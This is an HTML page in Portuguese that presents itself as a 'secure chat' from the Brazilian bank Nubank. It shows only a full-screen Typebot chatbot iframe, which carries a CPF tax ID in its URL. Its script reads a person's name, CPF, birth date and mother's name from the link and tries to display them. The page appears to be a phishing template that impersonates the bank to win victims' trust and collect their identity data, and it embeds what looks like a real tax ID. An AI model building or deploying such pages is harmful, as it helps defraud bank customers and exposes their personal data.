<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Chat Seguro - Nubank</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      background: #ffffff;
    }

    .iframe-wrapper {
      width: 100vw;
      height: 100vh;
      margin: 0;
      padding: 0;
      overflow: hidden;
    }

    iframe {
      border: none;
      width: 100%;
      height: 100%;
      display: block;
    }
  </style>
</head>
<body>
  <div class="iframe-wrapper">
    <iframe
      src="https://typebot.io/SEU-BOT-AQUI?cpf=37364246800"
      allow="clipboard-write"
    ></iframe>
  </div>

  <script>
    function getQueryParam(param) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(param);
    }

    // Pegando as variáveis da URL
    const nome = getQueryParam('nome');
    const cpf = getQueryParam('cpf');
    const nascimento = getQueryParam('datanasc');
    const mae = getQueryParam('mae');

    // Preenchendo os elementos da página
    if (nome) document.getElementById('nome').textContent = nome;
    if (cpf) document.getElementById('cpf').textContent = cpf;
    if (nascimento) document.getElementById('nascimento').textContent = nascimento;
    if (mae) document.getElementById('mae').textContent = mae;
  </script>

</body>
</html>
